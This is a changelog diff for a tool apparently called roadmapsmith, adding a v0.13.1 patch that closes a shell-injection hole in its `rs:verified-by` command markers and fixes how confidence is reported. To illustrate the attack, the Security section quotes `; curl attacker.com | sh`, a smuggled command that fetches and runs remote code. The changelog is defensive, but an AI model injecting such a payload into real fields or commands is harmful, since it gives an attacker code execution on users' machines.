@@ -1,5 +1,24 @@
 # Changelog
 
+## v0.13.1 - 2026-07-14
+
+Security + honesty patch. Two critical audit findings from the v0.13.0 review are addressed.
+
+### Security
+
+- **`rs:verified-by` commands now run without shell interpretation and are restricted to an allowlist** (`npm|pnpm|yarn|npx|node|deno|bun|python|python3|pytest|tsc|eslint|prettier|make|cargo|go|dotnet|mvn|gradle|bundle|rake|ruby`). Previously a malicious ROADMAP.md merged via PR could smuggle arbitrary shell payloads (`; curl attacker.com | sh`) into a maintainer's terminal via `roadmapsmith verify --run`. Now the command is `spawnSync(program, args, { shell: false })`, and the program is logged to stderr (`+ node --version`) as an audit trail before execution. If you need a command outside the allowlist, wrap it in an npm/yarn script and reference the script name.
+
+### Fixed
+
+- **`preservedCheckedState` passes surface as `confidence: 'preserved'` instead of `'low'`.** In default mode, a `[x]` task with no evidence used to return `passed: true, confidence: 'low'`, indistinguishable from a real low-confidence pass. Now the value is `'preserved'` with a reason explaining "add rs:kind=manual for explicit attestation, or run with --strict to reject preservation-only passes."
+- **`printAudit` reports the count and first 10 preserved-only tasks.** Consumers can grep the JSON output via `audit.preservedOnly`.
+- **`applyMinimumConfidence` now correctly downgrades preserved tasks** (rank -1 < low rank 0). Previously an early `if (result.preservedCheckedState) continue;` skipped the filter, making the "add --strict to reject" promise a lie.
+- **`rs:verified-by` marker parsing supports multi-token commands.** Previously `\S+` truncated at the first space (so `rs:verified-by=node --version` captured only `node`), forcing users to wrap every command in an npm script. Now the value captures up to the next `rs:` marker or end of flags.
+
+### Migration
+
+None required. `confidence: 'preserved'` is a strict superset of the old `'low'` classification for preserved tasks; consumers that check `if (result.passed)` keep working. Consumers that grouped by `confidence === 'low'` will see cleaner buckets. Command-verified tasks using shell metacharacters in `rs:verified-by=` must migrate to an npm-script wrapper.
+
 ## v0.13.0 - 2026-07-13
 
 Coordinated 5-minute-install refactor. Three of the four changes below are breaking. Run `roadmapsmith migrate-markers` in every consumer repo before upgrading.
